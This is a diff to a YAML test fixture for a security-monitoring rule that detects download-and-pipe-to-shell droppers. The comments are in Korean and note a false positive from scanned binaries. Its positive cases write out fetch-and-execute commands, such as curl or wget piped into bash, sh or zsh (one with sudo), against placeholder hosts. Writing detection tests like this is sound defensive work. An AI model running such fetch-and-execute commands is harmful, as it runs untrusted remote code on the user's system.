@@ -76,8 +76,19 @@ SOC_Curl_Pipe_Shell_Dropper:
       content: "curl -s http://malware.example/x.sh | bash"
     - name: wget 파이프 sh (공백 없음)
       content: "wget -qO- http://malware.example/x |sh"
+    - name: sudo 를 끼운 설치 스크립트 형태
+      content: "curl -fsSL https://get.example.com/install.sh | sudo bash"
+    - name: zsh 로 파이프
+      content: "curl http://malware.example/x | zsh"
   negative:
     - name: 평범한 헬스체크
       content: "curl -sf https://api.example.com/health || exit 1"
     - name: 로컬 스크립트를 셸에 파이프 (다운로드 아님)
       content: "cat /opt/setup.sh | bash"
+    - name: 받아서 검증만 (파이프 없음)
+      content: "curl -o out.bin http://example.com/f && sha256sum out.bin"
+    # /usr/bin 743개를 실제로 스캔했더니 ctest·tailscale 이 걸렸다 — 바이너리 안에
+    # "curl " 과 "| sh" 가 **서로 멀리 떨어져** 있었을 뿐이다. 자동 스캔을 켜면
+    # 이런 게 매번 알림으로 올라온다. 근접성 조건으로 고쳤고 여기서 고정한다.
+    - name: 문자열이 흩어진 바이너리 (실측 오탐이었다)
+      content: "curl usage: fetch a URL\n\n....(다른 섹션)....\n\npipe to | sh is unsupported"
